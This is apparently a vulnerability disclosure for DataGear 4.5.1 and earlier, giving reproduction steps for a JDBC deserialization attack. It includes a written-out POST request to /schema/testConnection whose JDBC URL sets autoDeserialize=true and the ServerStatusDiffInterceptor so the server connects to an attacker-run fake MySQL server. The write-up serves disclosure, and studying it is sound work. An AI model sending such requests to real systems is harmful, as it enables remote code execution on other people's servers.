Descriptionï¼š DataGear is an open source and free data visualization and analysis platform, free to create any data dashboard you want, and supports access to various data sources such as SQL, CSV, Excel, HTTP interface, and JSON. In Datagear 4.5.1 and earlier, an attacker can achieve jdbc deserialization attacks by uploading a vulnerable version of the mysql driver. After the upload is successful, an unauthenticated attacker can construct a malicious request to connect to a malicious JDBC server to trigger deserialization.


Version: datagear <= 4.5.1

Add:https://github.com/datageartech/datagear

Vulnerability recurrence:

1.login system. Upload the mysql driver with jdbc deserialization vulnerability version
<img width="1673" alt="image" src="https://user-images.githubusercontent.com/65865031/229347509-34f0f4e5-20ba-4f2e-8c68-08f2c7e8282b.png">
<img width="1397" alt="image" src="https://user-images.githubusercontent.com/65865031/229347555-15e84212-c006-4d2f-8f02-75460f9e0b6e.png">


2.Make URLDNS deserialized data

<img width="870" alt="image" src="https://user-images.githubusercontent.com/65865031/229347788-0a8792e2-1bc6-411a-a1df-4b7ad4a9cbd7.png">

3.Set up mysql_fake server

<img width="1221" alt="image" src="https://user-images.githubusercontent.com/65865031/229347910-a487e486-6646-44c1-872f-6148ec2ea6e4.png">

4.Find the data source, select the driver we added, and fill in the payload that triggers the vulnerability(removing cookies can also trigger the vulnerability)

<img width="1577" alt="image" src="https://user-images.githubusercontent.com/65865031/229347585-faa0687d-0a19-476a-9ae0-b6498c48a60e.png">

```
POST /schema/testConnection HTTP/1.1
Host: localhost:50401
Content-Length: 639
sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"
Accept: */*
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36
sec-ch-ua-platform: "macOS"
Origin: http://localhost:50401
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50401/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"id":"33141aada1873c584331","title":"test","url":"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor","user":"root","password":"root","createUser":{"id":"admin","name":"admin","realName":"","email":"","admin":true,"anonymous":false,"createTime":"2023-04-01 18:15:08","nameLabel":"admin"},"createTime":"2023-04-01 18:23:50","driverEntity":{"id":"116f66f1e1873c530001","driverClassName":"com.mysql.cj.jdbc.Driver","displayName":"mysql-connector-java-8.0.12","displayText":"mysql-connector-java-8.0.12","displayDescMore":""},"properties":[],"dataPermission":99}
```

5.Connecting to a malicious JDBC server triggers deserialization

<img width="1130" alt="image" src="https://user-images.githubusercontent.com/65865031/229347930-1f35f035-bb78-4b0f-926e-6fecbef85b28.png">


<img width="1712" alt="image" src="https://user-images.githubusercontent.com/65865031/229350058-289c8aa3-7222-41cb-ad7f-64ed68a83d08.png">
